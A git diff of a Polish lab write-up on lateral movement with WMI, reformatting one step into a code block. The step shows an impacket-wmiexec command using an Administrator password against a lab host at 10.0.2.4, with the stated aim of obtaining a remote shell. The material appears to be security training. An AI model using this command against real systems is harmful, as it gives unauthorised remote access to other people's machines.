@@ -6,7 +6,10 @@ Demonstracja techniki Lateral Movement z wykorzystaniem WMI (Windows Management 
 ## 2. Metodologia ataku
 Wykorzystałem narzędzie `impacket-wmiexec` do zdalnego wykonania kodu na hoście docelowym `Windows10-Target`.
 
-* **Komenda:** `impacket-wmiexec './Administrator:Haslo123!@10.0.2.4'`
+* **Komenda:**
+   ```bash
+   `impacket-wmiexec './Administrator:Haslo123!@10.0.2.4'`
+    ```
 * **Cel:** Uzyskanie zdalnej powłoki (shell) poprzez usługi WMI.
 
 <img width="765" height="423" alt="Kali" src="https://github.com/user-attachments/assets/4843a381-7473-4b9b-bad4-7a0fdecb0b3f" />
